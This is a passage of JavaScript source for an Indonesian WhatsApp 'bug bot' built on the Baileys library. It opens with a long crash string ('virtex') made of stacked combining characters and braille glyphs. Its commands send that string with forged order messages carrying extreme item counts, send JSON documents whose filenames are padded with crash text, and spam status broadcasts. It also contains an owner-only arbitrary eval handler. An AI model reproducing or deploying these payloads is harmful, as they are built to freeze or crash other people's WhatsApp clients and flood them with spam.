𝅱𝅱𝅱𝅱𝅱𝅱𝅱𝅱͈͈͈͈͈͈͈͈͈̮̮̮̮̮͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̀ࣴ̀̀̀̀̀ࣴࣴࣴࣴ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿̨𝅱𝅱𝅱𝅱𝅱𝅱𝅱𝅱𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼𝅼̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪̪𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̘̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̻̘̘̘̘̘͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇͇⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯⃯̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̺̺̺̺̺͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̮̮̮̮̮͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͆̍᪳᪳͌̽̽ࣨ̀ࣴ̀̀̀̀̀ࣴࣴࣴࣴ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ⠄⠄Zx⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⣧̼̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟̟͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈͈̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽𝅽̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̀̈᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳᪳ͅͅͅͅͅͅͅ⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄..
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'listbot':
    let tekss = '「 *LIST JADIBOT* 」\n'
    for(let i of listjadibot) {
    tekss += `*Nomor* : ${i.jid.split('@')[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`
    }
    reply(tekss)
    break
    		case 'jadibot':
			//    if(!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.callOwner())
			//    jadibot(reply,alpha,from)
			var jadibdj = await getBuffer('https://telegra.ph/file/18be96b6415ea8833dbe5.jpg')
							sendButLocation(from, jadibut() , `Jangan klik doang 〽️ ${enter}${enter}${nomerOwner}™© | By ${nomerOwner}`,jadibdj,  [{"buttonId": `p`,"buttonText": {"displayText": "ALL BUG"},"type": "RESPONSE"}], {})
							break
			    break
			    case 'jadibugjson':
if (!q) return reply(`Teks?`)
 if ((isMedia && !dev.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'clear':
reply(`🙏 Maaf Fitur Clear Sedang Ada Pembaruan Jadi hanya dikit yg dapat di clear Tolong Tunggu update Body selanjutnya`)
case 'jadibugjsonv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !dev.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
   let media = await zoe.downloadMediaMessage(encmedia)
   imeu = await zoe.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   zoe.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: '𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 ï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'spamsw':
if (!zoe.key.fromMe && !isOwner && !isCreator) return
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					zoe.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
                    
		case 'stopjadibot':
			    if (!zoe.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
			    stopjadibot(reply)
			    break
			  default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }

     if (!dev.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return zoe.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: dev }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[BODY]", "red"),
        "𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 ZoeDevv",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog 🌹
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// 𝙈𝙚𝙣𝙜𝙜𝙖𝙗𝙪𝙩シ︎